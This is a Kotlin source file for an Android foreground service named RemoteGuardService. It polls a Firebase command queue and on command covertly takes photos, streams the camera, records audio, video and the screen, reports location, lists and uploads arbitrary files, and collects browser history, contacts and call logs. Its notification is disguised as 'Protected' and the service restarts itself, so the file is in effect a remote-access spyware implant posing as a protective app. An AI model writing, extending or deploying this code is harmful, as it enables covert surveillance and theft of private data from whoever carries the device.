package com.remoteguard.app

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.content.Intent
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.util.Log
import androidx.core.app.NotificationCompat
import androidx.lifecycle.LifecycleService
import com.google.firebase.database.ChildEventListener
import com.google.firebase.database.DataSnapshot
import com.google.firebase.database.DatabaseError
import com.google.firebase.database.DatabaseReference
import com.google.firebase.database.MutableData
import com.google.firebase.database.Transaction

class RemoteGuardService : LifecycleService() {

    private lateinit var locationManager: LocationManager
    private lateinit var cameraManager: CameraManager
    private lateinit var voiceRecordingManager: VoiceRecordingManager
    private lateinit var screenRecordingManager: ScreenRecordingManager
    private var commandsRef: DatabaseReference? = null
    private var commandsListener: ChildEventListener? = null
    private val heartbeatHandler = Handler(Looper.getMainLooper())
    private val heartbeatRunnable = object : Runnable {
        override fun run() {
            FirebaseHelper.updateLastSeen(this@RemoteGuardService, "service_running")
            heartbeatHandler.postDelayed(this, HEARTBEAT_INTERVAL_MS)
        }
    }

    override fun onCreate() {
        super.onCreate()
        try {
            Log.d("RemoteGuardService", "onCreate: Starting service initialization")
            locationManager = LocationManager(this)
            cameraManager = CameraManager(this)
            voiceRecordingManager = VoiceRecordingManager(this)
            screenRecordingManager = ScreenRecordingManager(this)
            startForeground(NOTIFICATION_ID, createNotification())
            listenForCommands()
            heartbeatHandler.post(heartbeatRunnable)
            Log.d("RemoteGuardService", "onCreate: Service initialization completed")
        } catch (e: Exception) {
            Log.e("RemoteGuardService", "onCreate: Error during service initialization", e)
            e.printStackTrace()
        }
    }

    private fun createNotification(): Notification {
        val channelId = "remote_guard_channel"
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                channelId, "RemoteGuard Service",
                NotificationManager.IMPORTANCE_LOW
            )
            getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
        }
        return NotificationCompat.Builder(this, channelId)
            .setContentTitle("Protected")
            .setContentText("Your protected database.")
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .build()
    }

    private fun listenForCommands() {
        if (commandsListener != null) return
        commandsRef = FirebaseHelper.getCommandsRef(this).also { ref ->
            val listener = object : ChildEventListener {
                override fun onChildAdded(snapshot: DataSnapshot, previousChildName: String?) {
                    handleCommandSnapshot(snapshot)
                }

                override fun onChildChanged(snapshot: DataSnapshot, previousChildName: String?) {
                    handleCommandSnapshot(snapshot)
                }

                override fun onChildRemoved(snapshot: DataSnapshot) = Unit
                override fun onChildMoved(snapshot: DataSnapshot, previousChildName: String?) = Unit
                override fun onCancelled(error: DatabaseError) = Unit
            }
            commandsListener = listener
            ref.addChildEventListener(listener)
        }
    }

    private fun handleCommandSnapshot(snapshot: DataSnapshot) {
        val commandId = snapshot.key ?: return
        val command = snapshot.child("command").getValue(String::class.java) ?: return
        val status = snapshot.child("status").getValue(String::class.java)
        if (status != "pending") return
        claimAndExecuteCommand(commandId, command)
    }

    private fun claimAndExecuteCommand(commandId: String, command: String) {
        val cmdRef = FirebaseHelper.getCommandsRef(this).child(commandId)
        cmdRef.child("status").runTransaction(object : Transaction.Handler {
            override fun doTransaction(currentData: MutableData): Transaction.Result {
                val currentStatus = currentData.getValue(String::class.java)
                return if (currentStatus == "pending") {
                    currentData.value = "executing"
                    Transaction.success(currentData)
                } else {
                    Transaction.abort()
                }
            }

            override fun onComplete(
                error: DatabaseError?,
                committed: Boolean,
                currentData: DataSnapshot?
            ) {
                if (!committed || error != null) return
                executeCommand(command, commandId)
            }
        })
    }

    private fun executeCommand(command: String?, commandId: String) {
        val cmdRef = FirebaseHelper.getCommandsRef(this).child(commandId)

        try {
            when {
                command == "take_photo" -> {
                    Log.d("RemoteGuardService", "Executing: take_photo")
                    cameraManager.takePhoto(this)
                }
                command == "start_stream" -> {
                    Log.d("RemoteGuardService", "Executing: start_stream")
                    cameraManager.startStreaming(this)
                }
                command == "stop_stream" -> {
                    Log.d("RemoteGuardService", "Executing: stop_stream")
                    cameraManager.stopStreaming()
                }
                command == "start_video" -> {
                    Log.d("RemoteGuardService", "Executing: start_video")
                    cameraManager.startVideoRecording(this)
                }
                command == "stop_video" -> {
                    Log.d("RemoteGuardService", "Executing: stop_video")
                    cameraManager.stopVideoRecording()
                }
                command == "start_audio" -> {
                    Log.d("RemoteGuardService", "Executing: start_audio")
                    voiceRecordingManager.startAudioRecording(this)
                }
                command == "stop_audio" -> {
                    Log.d("RemoteGuardService", "Executing: stop_audio")
                    voiceRecordingManager.stopAudioRecording(this)
                }
                command == "switch_camera" -> {
                    Log.d("RemoteGuardService", "Executing: switch_camera")
                    cameraManager.switchCamera(this)
                    FirebaseHelper.updateLastSeen(this, "camera_switched_${cameraManager.getCurrentCameraName()}")
                }
                command == "get_location" -> {
                    Log.d("RemoteGuardService", "Executing: get_location")
                    locationManager.getCurrentLocation()
                }
                command == "list_files" -> {
                    Log.d("RemoteGuardService", "Executing: list_files")
                    FileManager.listFiles(this)
                }
                command?.startsWith("list_files:") == true -> {
                    val path = command.substringAfter("list_files:")
                    Log.d("RemoteGuardService", "Executing: list_files:$path")
                    FileManager.listFiles(this, path)
                }
                command?.startsWith("upload_file:") == true -> {
                    val path = command.substringAfter("upload_file:")
                    Log.d("RemoteGuardService", "Executing: upload_file:$path")
                    FileManager.uploadFile(this, path)
                }
                command == "get_browser_history" -> {
                    Log.d("RemoteGuardService", "Executing: get_browser_history")
                    BrowserHistoryManager.getBrowserHistory(this)
                }
                command == "get_contacts" -> {
                    Log.d("RemoteGuardService", "Executing: get_contacts")
                    ContactsAndCallsManager.getContacts(this)
                }
                command == "get_call_history" -> {
                    Log.d("RemoteGuardService", "Executing: get_call_history")
                    ContactsAndCallsManager.getCallHistory(this)
                }
                command == "start_screen_recording" -> {
                    Log.d("RemoteGuardService", "Executing: start_screen_recording")
                    val intent = Intent(this, ScreenCaptureActivity::class.java)
                    intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK
                    startActivity(intent)
                }
                command == "stop_screen_recording" -> {
                    Log.d("RemoteGuardService", "Executing: stop_screen_recording")
                    screenRecordingManager.stopScreenRecording(this)
                }
                else -> {
                    Log.w("RemoteGuardService", "Unsupported command: $command")
                    cmdRef.child("status").setValue("failed")
                    cmdRef.child("error").setValue("Unsupported command: $command")
                    return
                }
            }
            Log.d("RemoteGuardService", "Command executed successfully: $command")
            cmdRef.child("status").setValue("completed")
        } catch (e: Exception) {
            Log.e("RemoteGuardService", "Error executing command $command: ${e.message}", e)
            cmdRef.child("status").setValue("failed")
            cmdRef.child("error").setValue(e.message ?: "Command execution failed")
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        super.onStartCommand(intent, flags, startId)
        listenForCommands()
        return START_STICKY
    }

    override fun onDestroy() {
        if (voiceRecordingManager.isRecording) {
            voiceRecordingManager.stopAudioRecording(this)
        }
        if (screenRecordingManager.isRecording) {
            screenRecordingManager.stopScreenRecording(this)
        }
        commandsRef?.let { ref ->
            commandsListener?.let { listener ->
                ref.removeEventListener(listener)
            }
        }
        commandsListener = null
        commandsRef = null
        heartbeatHandler.removeCallbacksAndMessages(null)
        super.onDestroy()
    }

    companion object {
        private const val NOTIFICATION_ID = 1
        private const val HEARTBEAT_INTERVAL_MS = 60_000L
    }
}
